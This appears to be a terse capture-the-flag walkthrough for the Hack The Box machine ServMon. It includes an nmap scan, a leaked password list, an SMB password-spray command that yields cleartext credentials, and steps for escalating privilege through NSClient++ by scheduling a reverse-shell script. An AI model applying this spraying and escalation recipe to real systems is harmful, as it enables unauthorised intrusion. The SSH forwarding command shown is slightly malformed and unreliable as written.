```
nmap --min-rate 10 -p- 10.10.10.184
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-25 18:21 EDT
Nmap scan report for 10.10.10.184
Host is up (0.025s latency).
Not shown: 65488 closed tcp ports (conn-refused), 30 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
```

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

- `nxc smb 10.10.10.184 -u 'nathan' -p passwords.txt --shares`

```
ServMon\nadine:L1k3B1gBut7s@W0rk 
```

- NSClient++
`ew2x6SsGTxjRwXOT`
- nscp.exe --version says https://www.exploit-db.com/exploits/46802

- from the nsclient.ini config we see that the allowed hosts are 127.0.0.1. Now, we need local port forwarding for this to work.
- `ssh 1234:127.0.0.1:8443 nadine@10.10.10.184`

- access `127.0.0.1:1234` on firefox and enter the above password

- add external script to call the reverse shell
- add a scheduler to run the above script every 10 seconds
- start a listener for the above reverse shell
